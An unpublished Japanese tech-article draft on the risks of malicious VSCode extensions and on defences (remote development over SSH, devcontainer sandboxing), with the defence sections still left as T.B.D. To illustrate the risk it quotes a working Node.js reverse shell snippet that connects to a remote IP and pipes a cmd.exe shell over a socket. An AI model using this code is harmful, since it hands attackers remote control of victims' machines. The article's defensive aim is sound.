---
title: "悪意のあるVSCodeの拡張機能から開発環境を守る防衛術"
emoji: "⛹️"
type: "tech" # tech: 技術記事 / idea: アイデア
topics: [vscode]
published: false
---
VSCodeの拡張機能は、子プロセスを展開したりシステムコールを実行したり任意のNode.jsパッケージをインポートしたりすることができる。

たとえば以下のようなコードで子プロセスを簡単に起動できる。
```typescript

import { exec } from "node:child_process";
exec(`${任意のコマンド}`)
```

実際にあった例として、以下のように攻撃者のリモートホストに接続してリバースシェルを提供させるコードが見つかったりしている
```typescript
let net = require("net");
let shell = exec("cmd.exe");
var client_sock = new net.Socket();
client_sock.connect(9090, "192.168.71.132", () => {
    client_sock.pipe(shell.stdin);
    shell.stdout.pipe(client_sock);
    shell.stderr.pipe(client_sock);
});
```

実際に、人気拡張機能を装った偽拡張機能を作った[実験を行ったところ数多くの有名どころを含む企業でダウンロードされたことが報告されている](https://gigazine.net/news/20240611-visual-studio-code-extension-risk/)。

## 主なリスク
- 見られたくない情報が流出してしまう(ディレクトリトラバーサル)
- 端末に任意の処理を実行させられてしまう(スクリプトインジェクション)

## 対策
### remote development(SSH)を使ったローカル環境分離
T.B.D
https://code.visualstudio.com/docs/remote/remote-overview

### devcontainerを使用したファイルシステムとネットワークの両方のサンドボックス化
T.B.D
https://github.com/microsoft/vscode/issues/52116#issuecomment-2028487842

## 参考
- https://zenn.dev/nagashima/articles/7dbee49bbea420
- https://github.com/microsoft/vscode/issues/52116
- https://gigazine.net/news/20240611-visual-studio-code-extension-risk/
